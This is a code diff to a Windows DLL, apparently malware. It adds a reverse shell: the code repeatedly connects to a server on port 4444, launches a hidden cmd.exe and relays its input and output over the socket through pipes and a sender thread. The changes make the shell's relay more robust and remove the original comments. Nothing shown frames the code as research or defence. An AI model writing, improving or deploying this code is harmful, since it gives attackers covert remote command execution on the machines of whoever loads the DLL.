@@ -7,6 +7,16 @@
 #pragma comment(lib, "ws2_32")
 #pragma warning(disable:4996)
 using namespace std;
+SOCKET s;
+void sendmessage(LPVOID IpParameter)
+{
+	HANDLE hReadPipe = (HANDLE)IpParameter;
+	int ret{};
+	char recvBuf[1025];
+	DWORD dw{};
+	while (ReadFile(hReadPipe, recvBuf, 1024, &dw, NULL))
+		send(s, recvBuf, dw, 0);
+}
 void connectserver()
 {
 	unsigned short  Port = 4444;
@@ -17,23 +27,22 @@ void connectserver()
 	ServerAddr.sin_port = htons(Port);
 	while (true)
 	{
-		SOCKET	s;
 		while (true)
 		{
 			struct hostent* hptr;
 			while ((hptr = gethostbyname("localhost")) == NULL);
 			ServerAddr.sin_addr.S_un.S_addr = *((ULONG*)(hptr->h_addr));
-			while ((s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL)) == 0);
-			int keepAlive = 1; // 开启keepalive属性
+			while ((s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, 0, WSA_FLAG_OVERLAPPED)) == 0);
+			int keepAlive = 1;
 			setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, (const char*)&keepAlive, sizeof(keepAlive));
 			struct tcp_keepalive in_keep_alive = { 0 };
 			unsigned long ul_in_len = sizeof(struct tcp_keepalive);
 			struct tcp_keepalive out_keep_alive = { 0 };
 			unsigned long ul_out_len = sizeof(struct tcp_keepalive);
 			unsigned long ul_bytes_return = 0;
-			in_keep_alive.onoff = 1;                    /*打开keepalive*/
-			in_keep_alive.keepaliveinterval = 5000; /*发送keepalive心跳时间间隔-单位为毫秒*/
-			in_keep_alive.keepalivetime = 1000;         /*多长时间没有报文开始发送keepalive心跳包-单位为毫秒*/
+			in_keep_alive.onoff = 1;
+			in_keep_alive.keepaliveinterval = 5000;
+			in_keep_alive.keepalivetime = 1000;
 			WSAIoctl(s, SIO_KEEPALIVE_VALS, (LPVOID)&in_keep_alive, ul_in_len,
 				(LPVOID)&out_keep_alive, ul_out_len, &ul_bytes_return, NULL, NULL);
 			if (connect(s, (SOCKADDR*)&ServerAddr, sizeof(ServerAddr)) != SOCKET_ERROR)
@@ -42,19 +51,42 @@ void connectserver()
 		}
 		char SystemName[128] = "cmd";
 		STARTUPINFO si;
-		PROCESS_INFORMATION pi;
 		GetStartupInfo(&si);
 		si.cb = sizeof(STARTUPINFO);
-		si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
 		si.wShowWindow = SW_HIDE;
 		si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
+		HANDLE hWritePipe = NULL, hReadPipe = NULL;
+		SECURITY_ATTRIBUTES sa;
+		sa.bInheritHandle = TRUE;
+		sa.lpSecurityDescriptor = NULL;
+		sa.nLength = sizeof(SECURITY_ATTRIBUTES);
+		if (!CreatePipe(&si.hStdInput, &hWritePipe, &sa, 0) || !CreatePipe(&hReadPipe, &si.hStdOutput, &sa, 0))
+		{
+			closesocket(s);
+			continue;
+		}
+		si.hStdError = si.hStdOutput;
+		PROCESS_INFORMATION pi;
 		CreateProcess(NULL, SystemName, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi);
+		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)sendmessage, (LPVOID)hReadPipe, 0, NULL);
+		int ret{};
+		char recvBuf[1025];
+		DWORD dw{};
+		while ((ret = recv(s, recvBuf, 1024, 0)) > 0)
+		{
+			WriteFile(hWritePipe, recvBuf, ret, &dw, NULL);
+		}
+		WriteFile(hWritePipe, "exit\r\n", 6, &dw, NULL);
+		CloseHandle(hWritePipe);
+		CloseHandle(si.hStdInput);
+		CloseHandle(si.hStdOutput);
+		CloseHandle(hReadPipe);
 		WaitForSingleObject(pi.hProcess, INFINITE);
+		CloseHandle(pi.hThread);
+		CloseHandle(pi.hProcess);
 		closesocket(s);
 	}
 }
-
-
 BOOL APIENTRY DllMain( HMODULE hModule,
                        DWORD  ul_reason_for_call,
                        LPVOID lpReserved
